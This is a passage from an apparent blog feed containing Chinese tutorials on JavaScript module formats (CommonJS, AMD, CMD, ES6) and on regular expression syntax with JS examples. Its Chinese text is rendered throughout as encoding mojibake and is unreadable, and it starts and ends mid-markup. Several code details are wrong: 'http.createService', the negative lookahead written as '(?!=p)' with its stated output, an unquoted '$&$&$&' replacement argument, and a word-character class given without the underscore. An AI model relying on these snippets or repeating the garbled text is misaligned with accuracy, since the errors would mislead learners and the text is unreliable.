å¼•ç”¨æ ¸å¿ƒæ¨¡å—ï¼Œä¸éœ€è¦å¸¦è·¯å¾„</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">http.createService(...).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="3-AMDï¼ˆdefine-requireï¼‰"><a href="#3-AMDï¼ˆdefine-requireï¼‰" class="headerlink" title="3. AMDï¼ˆdefine, requireï¼‰"></a>3. AMDï¼ˆdefine, requireï¼‰</h3><p>å®ƒæ˜¯ç”± RequireJS çš„ä½œè€… James Burke æå‡ºçš„ä¸€ç§æ¨¡å—åŒ–è§„èŒƒã€‚AMD è§„èŒƒçš„ä¸»è¦ç‰¹ç‚¹æ˜¯ï¼šå¼‚æ­¥åŠ è½½ã€æå‰æ‰§è¡Œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰math.jsæ¨¡å—</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    add: add,</span><br><span class="line">    basicNum: basicNum,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªä¾èµ–underscore.jsçš„æ¨¡å—</span></span><br><span class="line">define([<span class="string">'underscore'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">_</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> classify = <span class="function"><span class="keyword">function</span>(<span class="params">list</span>)</span>&#123;</span><br><span class="line">    _.countBy(list,<span class="function"><span class="keyword">function</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> num &gt; <span class="number">30</span> ? <span class="string">'old'</span> : <span class="string">'young'</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    classify :classify</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼•ç”¨æ¨¡å—ï¼Œå°†æ¨¡å—æ”¾åœ¨[]å†…</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">'jquery'</span>, <span class="string">'math'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">$, math</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = math.add(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-CMD"><a href="#4-CMD" class="headerlink" title="4. CMD"></a>4. CMD</h3><p>CMD è§„èŒƒæ•´åˆäº† CommonJS å’Œ AMD è§„èŒƒçš„ç‰¹ç‚¹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰æ²¡æœ‰ä¾èµ–çš„æ¨¡å—</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>)</span>&#123;</span><br><span class="line">  exports.xxx = value</span><br><span class="line">  <span class="built_in">module</span>.exports = value</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//å®šä¹‰æœ‰ä¾èµ–çš„æ¨¡å—</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//å¼•å…¥ä¾èµ–æ¨¡å—(åŒæ­¥)</span></span><br><span class="line">    <span class="keyword">var</span> module2 = <span class="built_in">require</span>(<span class="string">'./module2'</span>)</span><br><span class="line">    <span class="comment">//å¼•å…¥ä¾èµ–æ¨¡å—(å¼‚æ­¥)</span></span><br><span class="line">    <span class="built_in">require</span>.async(<span class="string">'./module3'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m3</span>) </span>&#123;</span><br><span class="line">  &#125;)</span><br><span class="line">    <span class="comment">//æš´éœ²æ¨¡å—</span></span><br><span class="line">    exports.xxx = value</span><br><span class="line"> &#125;)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// å¼•å…¥è¯¥æ¨¡å—</span></span><br><span class="line"> define(<span class="function"><span class="keyword">function</span> (<span class="params">require</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> m1 = <span class="built_in">require</span>(<span class="string">'./module1'</span>)</span><br><span class="line">  <span class="keyword">var</span> m4 = <span class="built_in">require</span>(<span class="string">'./module4'</span>)</span><br><span class="line">  m1.show()</span><br><span class="line">  m4.show()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-åŒºåˆ«"><a href="#5-åŒºåˆ«" class="headerlink" title="5. åŒºåˆ«"></a>5. åŒºåˆ«</h3><h4 id="5-1-å€¼æ‹·è´-å€¼å¼•ç”¨"><a href="#5-1-å€¼æ‹·è´-å€¼å¼•ç”¨" class="headerlink" title="5.1 å€¼æ‹·è´ / å€¼å¼•ç”¨"></a>5.1 å€¼æ‹·è´ / å€¼å¼•ç”¨</h4><ul><li>commonJSè¾“å‡ºçš„æ˜¯å€¼çš„æ‹·è´ã€‚ä¸€æ—¦è¾“å‡ºä¸€ä¸ªå€¼ï¼Œæ¨¡å—å†…éƒ¨çš„å˜åŒ–å°±å½±å“ä¸åˆ°è¿™ä¸ªå€¼ã€‚</li><li>ES6 Moduleè¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨ã€‚JSå¼•æ“åœ¨é‡åˆ°ES6æ¨¡å—<code>import</code>å‘½ä»¤æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªåªè¯»å¼•ç”¨ã€‚ç­‰è„šæœ¬çœŸæ­£æ‰§è¡Œçš„æ—¶å€™ï¼Œæ ¹æ®å¼•ç”¨ï¼Œåˆ°è¢«åŠ è½½çš„æ¨¡å—é‡Œé¢å»å–å€¼ã€‚å¦‚æœä¸€ä¸ªæ¨¡å—ä¿®æ”¹äº†å¦ä¸€ä¸ªæ¨¡å—å¯¼å‡ºçš„å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªä¿®æ”¹ä¼šå½±å“åˆ°åŸå§‹æ¨¡å—ã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lib.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">let</span> counter = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">incCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  counter ++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="comment">// ES6æ¨¡å—è¾“å‡ºçš„å˜é‡counteræ˜¯æ´»çš„ï¼Œå®Œå…¨ååº”å…¶åœ¨æ¨¡å—lib.jså†…éƒ¨çš„å˜åŒ–</span></span><br><span class="line"><span class="keyword">import</span> &#123; counter, incCounter &#125; <span class="keyword">from</span> <span class="string">'./lib'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(counter);   <span class="comment">// 3</span></span><br><span class="line">incCounter();</span><br><span class="line"><span class="built_in">console</span>.log(counter);   <span class="comment">// 4</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-2-è¿è¡Œæ—¶åŠ è½½-ç¼–è¯‘æ—¶åŠ è½½"><a href="#5-2-è¿è¡Œæ—¶åŠ è½½-ç¼–è¯‘æ—¶åŠ è½½" class="headerlink" title="5.2 è¿è¡Œæ—¶åŠ è½½ / ç¼–è¯‘æ—¶åŠ è½½"></a>5.2 è¿è¡Œæ—¶åŠ è½½ / ç¼–è¯‘æ—¶åŠ è½½</h4><ul><li>commonJS æ˜¯è¿è¡Œæ—¶åŠ è½½ï¼Œåªæœ‰è¿è¡Œæ—¶æ‰èƒ½å¾—åˆ°æ¨¡å—exportçš„å¯¹è±¡ã€‚</li><li>ES6 module æ˜¯ç¼–è¯‘æ—¶åŠ è½½ï¼Œç¼–è¯‘æ—¶å°±è¦ç¡®å®šæ¨¡å—çš„ä¾èµ–å…³ç³»ã€‚</li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="http://es6.ruanyifeng.com/#docs/module" target="_blank" rel="noopener">Moduleçš„è¯­æ³•</a></li><li><a href="http://es6.ruanyifeng.com/#docs/module-loader" target="_blank" rel="noopener">Module çš„åŠ è½½å®ç°</a></li><li><a href="https://juejin.im/post/5aaa37c8f265da23945f365c" target="_blank" rel="noopener">å‰ç«¯æ¨¡å—åŒ–ï¼šCommonJS,AMD,CMD,ES6</a></li><li><a href="https://juejin.cn/post/7301266090750787621" target="_blank" rel="noopener">èŠèŠå‰ç«¯æ¨¡å—åŒ–</a></li><li><a href="https://www.zhihu.com/people/111111-80-11-31" target="_blank" rel="noopener">å¦‚ä½•è¯„ä»·é˜®ä¸€å³°å…³äºå‰ç«¯å·¥å…·å˜åŒ–å¿«çš„è¨€è®ºï¼Ÿ</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” æ­£åˆ™è¡¨è¾¾å¼</title>
      <link href="/2019/06/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2019/06/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      <content type="html"><![CDATA[<blockquote><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ä¸ªæè¿°è§„åˆ™çš„è¡¨è¾¾å¼ï¼Œå®ƒå¯ä»¥åŒ¹é…æ¨¡å¼ï¼ŒåŒ¹é…å­—ç¬¦ï¼ŒåŒ¹é…ä½ç½®ï¼Œè¿›è€Œå®ç°æœç´¢å’Œæ›¿æ¢åŠŸèƒ½ã€‚</p></blockquote><p><br></p><h3 id="1-åŒ¹é…è§„åˆ™"><a href="#1-åŒ¹é…è§„åˆ™" class="headerlink" title="1. åŒ¹é…è§„åˆ™"></a>1. åŒ¹é…è§„åˆ™</h3><h4 id="1-1-å•ä¸ªå­—ç¬¦"><a href="#1-1-å•ä¸ªå­—ç¬¦" class="headerlink" title="1.1 å•ä¸ªå­—ç¬¦"></a>1.1 å•ä¸ªå­—ç¬¦</h4><p>å•ä¸ªå­—ç¬¦çš„æ˜ å°„å…³ç³»æ˜¯ä¸€å¯¹ä¸€çš„ï¼ŒåŒ¹é…åˆ°çš„å­—ç¬¦åªæœ‰ä¸€ä¸ªã€‚</p><table><thead><tr><th>åŒ¹é…ç±»å‹</th><th style="text-align:right">æ­£åˆ™è¡¨è¾¾å¼</th></tr></thead><tbody><tr><td>ç®€å•å­—ç¬¦</td><td style="text-align:right">a ï¼ˆåŒ¹é…å­—ç¬¦aï¼‰</td></tr><tr><td>ç‰¹æ®Šå­—ç¬¦</td><td style="text-align:right"><code>\*</code> ï¼ˆåŒ¹é…å­—ç¬¦*ï¼Œç‰¹æ®Šå­—ç¬¦ç”¨\è½¬ä¹‰ï¼‰</td></tr><tr><td>æ¢è¡Œç¬¦</td><td style="text-align:right">\n      </td></tr><tr><td>æ¢é¡µç¬¦</td><td style="text-align:right">\f       </td></tr><tr><td>å›è½¦ç¬¦</td><td style="text-align:right">\r        </td></tr><tr><td>ç©ºç™½ç¬¦</td><td style="text-align:right">\s        </td></tr><tr><td>åˆ¶è¡¨ç¬¦</td><td style="text-align:right">\t        </td></tr><tr><td>å‚ç›´åˆ¶è¡¨ç¬¦</td><td style="text-align:right">\v       </td></tr><tr><td>å›é€€ç¬¦</td><td style="text-align:right"><code>[\b]</code>      </td></tr></tbody></table><p><br></p><h4 id="1-2-åŒºé—´"><a href="#1-2-åŒºé—´" class="headerlink" title="1.2 åŒºé—´"></a>1.2 åŒºé—´</h4><p> <em><code>[]</code></em> æ¥è¡¨ç¤ºé›†åˆï¼Œç”¨ <em><code>-</code></em> æ¥è¡¨ç¤ºå»åŒºé—´èŒƒå›´ï¼Œå°±å¯ä»¥å®ç°ä¸€å¯¹å¤šçš„åŒ¹é…ã€‚<br><em>/[123]/</em> åŒ¹é…1,2,3ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œ<em>/[0-9]/</em> åŒ¹é…0åˆ°9çš„ä»»æ„ä¸€ä¸ªæ•°å­—ï¼Œ<em>/[a-z]/</em> åŒ¹é…ä»»æ„ä¸€ä¸ªè‹±æ–‡å°å†™å­—æ¯ã€‚</p><table><thead><tr><th>åŒ¹é…åŒºé—´</th><th style="text-align:center">æ­£åˆ™è¡¨è¾¾å¼</th><th style="text-align:right">è®°å¿†æ–¹å¼</th></tr></thead><tbody><tr><td>é›†åˆåŒºé—´</td><td style="text-align:center">[123]</td><td style="text-align:right">åŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œå¯ä»¥æ˜¯1,2,3ä¹‹ä¸€</td></tr><tr><td>é€šé…ç¬¦ï¼Œè¡¨ç¤ºå‡ ä¹ä»»æ„å­—ç¬¦ã€‚æ¢è¡Œç¬¦ã€å›è½¦ç¬¦ã€è¡Œåˆ†éš”ç¬¦å’Œæ®µåˆ†éš”ç¬¦é™¤å¤–ã€‚</td><td style="text-align:center">.</td><td style="text-align:right"></td></tr><tr><td>å•ä¸ªæ•°å­—ï¼Œ[0-9]</td><td style="text-align:center">\d</td><td style="text-align:right">digit</td></tr><tr><td>é™¤äº†[0-9]</td><td style="text-align:center">\D</td><td style="text-align:right">not digit</td></tr><tr><td>åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…çš„å•ä¸ªå­—ç¬¦[A-Za-z0-9]</td><td style="text-align:center">\w</td><td style="text-align:right">word</td></tr><tr><td>éå•å­—å­—ç¬¦</td><td style="text-align:center">\W</td><td style="text-align:right">not word</td></tr><tr><td>åŒ¹é…ç©ºç™½ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦å’Œæ¢é¡µç¬¦</td><td style="text-align:center">\s</td><td style="text-align:right">space</td></tr><tr><td>åŒ¹é…éç©ºç™½å­—ç¬¦</td><td style="text-align:center">\S</td><td style="text-align:right">not space    </td></tr><tr><td>åŒ¹é…ä»»æ„å­—ç¬¦</td><td style="text-align:center">[\d\D]ã€[\w\W]ã€[\s\S]</td><td style="text-align:right"></td></tr></tbody></table><p><br></p><h4 id="1-3-é‡è¯"><a href="#1-3-é‡è¯" class="headerlink" title="1.3 é‡è¯"></a>1.3 é‡è¯</h4><p>å¤šæ¬¡å¾ªç¯ï¼Œé‡å¤ä¸Šé¢çš„æ­£åˆ™è§„åˆ™ï¼Œå°±å¯ä»¥åŒ¹é…åŒ¹é…å¤šä¸ªå­—ç¬¦ã€‚</p><table><thead><tr><th>ç¬¦å·</th><th style="text-align:center">é‡å¤æ¬¡æ•°</th><th style="text-align:center">ä¾‹å­</th><th style="text-align:right"></th></tr></thead><tbody><tr><td>?</td><td style="text-align:center">0æ¬¡æˆ–1æ¬¡</td><td style="text-align:center">/colour?/</td><td style="text-align:right">åŒ¹é…colouå’Œcolourä¸¤ä¸ªå•è¯</td></tr><tr><td>+</td><td style="text-align:center">1æ¬¡æˆ–å¤šæ¬¡</td><td style="text-align:center">/color+/</td><td style="text-align:right">åŒ¹é…color, colorr, colorrrâ€¦</td></tr><tr><td>{n}</td><td style="text-align:center">åŒºé—´æ¬¡æ•°</td><td style="text-align:center">/a{3}/</td><td style="text-align:right">è¿ç»­å‡ºç°a 3æ¬¡</td></tr><tr><td>{min,max}</td><td style="text-align:center">minåˆ°maxæ¬¡</td><td style="text-align:center">/a{1,2}/</td><td style="text-align:right">è¿ç»­å‡ºç°a 1-2æ¬¡</td></tr><tr><td>{min,}</td><td style="text-align:center">è‡³å°‘minæ¬¡</td><td style="text-align:center">/a{1,}/</td><td style="text-align:right">è¿ç»­å‡ºç°aè‡³å°‘1æ¬¡</td></tr><tr><td>{0, max}</td><td style="text-align:center">æœ€å¤šmaxæ¬¡</td><td style="text-align:center">/a{0,3}/</td><td style="text-align:right">è¿ç»­å‡ºç°aæœ€å¤š3æ¬¡</td></tr><tr><td>*</td><td style="text-align:center">åŒ¹é…0ä¸ªå­—ç¬¦æˆ–æ— æ•°ä¸ªå­—ç¬¦</td><td style="text-align:center">/*/</td><td style="text-align:right">ç”¨æ¥è¿‡æ»¤å¯æœ‰å¯æ— çš„å­—ç¬¦ä¸²</td></tr></tbody></table><p><br></p><h4 id="1-5-ä½ç½®ç¬¦"><a href="#1-5-ä½ç½®ç¬¦" class="headerlink" title="1.5 ä½ç½®ç¬¦"></a>1.5 ä½ç½®ç¬¦</h4><p>ä½ç½®æ˜¯ç›¸é‚»å­—ç¬¦ä¹‹é—´çš„ä½ç½®ã€‚<br><img src="/2019/06/10/æ­£åˆ™è¡¨è¾¾å¼/1.png" style="max-width: 300px"></p><table><thead><tr><th>ç¬¦å·</th><th style="text-align:center">å«ä¹‰</th><th style="text-align:center">ä¾‹å­</th><th style="text-align:right"></th></tr></thead><tbody><tr><td>\b</td><td style="text-align:center">å•è¯è¾¹ç•Œ,\wå’Œ\Wä¹‹é—´çš„ä½ç½®,ä¹ŸåŒ…æ‹¬\wå’Œ^,\wå’Œ$ä¹‹é—´çš„ä½ç½®</td><td style="text-align:center">/\bcat\b/</td><td style="text-align:right">åŒ¹é…catï¼ŒåŒ¹é…ä¸åˆ°scattered</td></tr><tr><td>^</td><td style="text-align:center">åŒ¹é…å¼€å¤´ï¼Œåœ¨å¤šè¡ŒåŒ¹é…ä¸­åŒ¹é…å¼€å¤´</td><td style="text-align:center">/^I am/</td><td style="text-align:right">ä»¥I amå¼€å¤´çš„å­—ç¬¦ä¸²</td></tr><tr><td>$</td><td style="text-align:center">åŒ¹é…ç»“å°¾ï¼Œåœ¨å¤šè¡ŒåŒ¹é…ä¸­åŒ¹é…ç»“å°¾</td><td style="text-align:center">/^I am good.$/</td><td style="text-align:right">åŒ¹é…I am goodè¿™ä¸ªå¥å­</td></tr><tr><td>(?=p)</td><td style="text-align:center">pæ˜¯ä¸€ä¸ªå­æ¨¡å¼ï¼Œè¡¨ç¤ºpå‰é¢çš„ä½ç½®</td><td style="text-align:center">/(?=l)/g</td><td style="text-align:right">æ‰€æœ‰lå‰é¢çš„ä½ç½®</td></tr><tr><td>(?!=p)</td><td style="text-align:center">(?=p)çš„åé¢æ„æ€</td><td style="text-align:center"></td><td style="text-align:right"></td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/^|$/g</span>, <span class="string">'#'</span>)              <span class="comment">// "#hello#"</span></span><br><span class="line"><span class="string">"[JS] lesson_01.mp4"</span>.replace(<span class="regexp">/\b/g</span>, <span class="string">'#'</span>)  <span class="comment">// "[#JS#] #lesson_01#.#mp4#"</span></span><br><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/(?=l)/g</span>, <span class="string">"#"</span>)            <span class="comment">// "he#l#lo"</span></span><br><span class="line"><span class="string">"hello"</span>.replace(<span class="regexp">/(?!=l)/g</span>, <span class="string">"#"</span>)           <span class="comment">// "#h#ell#o#"</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-åˆ†ç»„-å›æº¯å¼•ç”¨"><a href="#1-4-åˆ†ç»„-å›æº¯å¼•ç”¨" class="headerlink" title="1.4 åˆ†ç»„,å›æº¯å¼•ç”¨"></a>1.4 åˆ†ç»„,å›æº¯å¼•ç”¨</h4><p><em>()</em> è¡¨ç¤ºä¸€ä¸ªåˆ†ç»„ï¼Œåªæ˜¯ä½¿ç”¨ç®€å•çš„(regex)æœ¬è´¨ä¸Šå’Œä¸åˆ†ç»„æ˜¯ä¸€æ ·çš„ï¼Œè¦å‘æŒ¥å®ƒå¼ºå¤§çš„ä½œç”¨ï¼Œè¦ç»“åˆå›æº¯å¼•ç”¨ã€‚</p><p><em><code>\1, \2....</code></em> è¡¨ç¤ºå¼•ç”¨çš„ç¬¬1,2ä¸ªå­è¡¨è¾¾å¼â€¦ <em><code>\0</code></em> è¡¨ç¤ºæ•´ä¸ªè¡¨è¾¾å¼ã€‚<strong>å›æº¯å¼•ç”¨</strong> æŒ‡åé¢å¼•ç”¨å‰é¢å·²ç»åŒ¹é…åˆ°çš„å­å­—ç¬¦ä¸²ã€‚</p><p><em><code>$1, $2...</code></em> ç”¨äºå¼•ç”¨è¦è¢«æ›¿æ¢çš„å­—ç¬¦ä¸²<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/\b(\w)+\s\1/</span>   <span class="comment">// åŒ¹é…ä¸¤ä¸ªè¿ç»­ç›¸åŒçš„å•è¯</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'abc abc 123'</span>;</span><br><span class="line">str.replace(<span class="regexp">/(ab)c/g</span>, <span class="string">'$1g'</span>); <span class="comment">// 'abg abg 123'</span></span><br></pre></td></tr></table></figure></p><p><em><code>$&amp;</code></em> åŒ¹é…å­ä¸²æ–‡æœ¬<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// '2,3,5'å˜æˆ'222,333,555'</span></span><br><span class="line"><span class="string">"2,3,5"</span>.replace(<span class="regexp">/(\d)+/g</span>, $&amp;$&amp;$&amp;);  <span class="comment">// 222,333,555</span></span><br></pre></td></tr></table></figure></p><p><em><code>(?:regex)</code></em>ï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³å­è¡¨è¾¾å¼è¢«å¼•ç”¨ï¼Œå¯ä»¥ç”¨<strong>éæ•è·æ­£åˆ™</strong>, è¿™æ ·å¯ä»¥é¿å…æµªè´¹å†…å­˜ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'scq000'</span>;</span><br><span class="line">str.replace(<span class="regexp">/(scq00)(?:0)/</span>, <span class="string">'$1,$2'</span>);  <span class="comment">// 'scq00,$2'</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨äº†éæ•è·æ­£åˆ™ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªå¼•ç”¨æ²¡æœ‰å€¼ï¼Œè¿™é‡Œç›´æ¥æ›¿æ¢ä¸º$2</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-5-é€»è¾‘å¤„ç†"><a href="#1-5-é€»è¾‘å¤„ç†" class="headerlink" title="1.5 é€»è¾‘å¤„ç†"></a>1.5 é€»è¾‘å¤„ç†</h4><table><thead><tr><th>é€»è¾‘å…³ç³»</th><th style="text-align:right">æ­£åˆ™è¡¨è¾¾å¼</th></tr></thead><tbody><tr><td>ä¸</td><td style="text-align:right">æ—              </td></tr><tr><td>é</td><td style="text-align:right">[^regex] å’Œ !  </td></tr><tr><td>æˆ–</td><td style="text-align:right">&#124;</td></tr></tbody></table><p><br></p><h4 id="1-6-ä¿®é¥°ç¬¦"><a href="#1-6-ä¿®é¥°ç¬¦" class="headerlink" title="1.6 ä¿®é¥°ç¬¦"></a>1.6 ä¿®é¥°ç¬¦</h4><p>ä¿®é¥°ç¬¦æ”¾åœ¨äº†<code>/regex/img</code>æ­£åˆ™è¡¨è¾¾å¼çš„æœ€åé¢ã€‚</p><table><thead><tr><th>ä¿®é¥°ç¬¦</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>m</td><td style="text-align:center">å¤šè¡ŒåŒ¹é… multiline</td></tr><tr><td>i</td><td style="text-align:center">å¿½ç•¥å¤§å°å†™ ignore       </td></tr><tr><td>g</td><td style="text-align:center">å…¨å±€åŒ¹é…globalï¼Œ åœ¨ç›®æ ‡å­—ç¬¦ä¸²ä¸­æŒ‰é¡ºåºæ‰¾åˆ°æ»¡è¶³åŒ¹é…æ¨¡å¼çš„æ‰€æœ‰å­ä¸²</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/ab&#123;2,4&#125;c/g</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"abc abbc abbbc abbbbc abbbbbc"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(string.match(regex));</span><br><span class="line"><span class="comment">// ["abbc", "abbbc", "abbbbc"]</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-æ­£åˆ™è¡¨è¾¾å¼-JS"><a href="#2-æ­£åˆ™è¡¨è¾¾å¼-JS" class="headerlink" title="2. æ­£åˆ™è¡¨è¾¾å¼ + JS"></a>2. æ­£åˆ™è¡¨è¾¾å¼ + JS</h3><p>æœ‰äº†æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œç»“åˆJS apiï¼Œæˆ‘ä»¬å¯ä»¥å®ŒæˆéªŒè¯ã€åˆ‡åˆ†ã€æå–ã€æ›¿æ¢çš„åŠ¨ä½œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.search(regex)</span><br><span class="line"><span class="built_in">String</span>.split(regex)</span><br><span class="line"><span class="built_in">String</span>.match(regex)</span><br><span class="line"><span class="built_in">String</span>.replace(regex, newText)</span><br><span class="line"><span class="built_in">RegExp</span>.test(string)</span><br><span class="line"><span class="built_in">RegExp</span>.exec(string)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-1-éªŒè¯"><a href="#2-1-éªŒè¯" class="headerlink" title="2.1 éªŒè¯"></a>2.1 éªŒè¯</h4><p>åˆ¤æ–­æœ‰æ²¡æœ‰åŒ¹é…ä¸Š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ‰æ²¡æœ‰æ•°å­—</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d/</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"abc123"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ€å¸¸ç”¨çš„æ˜¯test</span></span><br><span class="line"><span class="built_in">console</span>.log(regex.test(string));        <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-åˆ‡åˆ†"><a href="#2-2-åˆ‡åˆ†" class="headerlink" title="2.2 åˆ‡åˆ†"></a>2.2 åˆ‡åˆ†</h4><p>æŠŠç›®æ ‡å­—ç¬¦ä¸²ï¼Œåˆ‡æˆä¸€æ®µä¸€æ®µ <code>string.split(regex)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ—¥æœŸæ ¼å¼åˆ‡é™¤å¹´æœˆæ—¥</span></span><br><span class="line"><span class="keyword">var</span> regex = <span 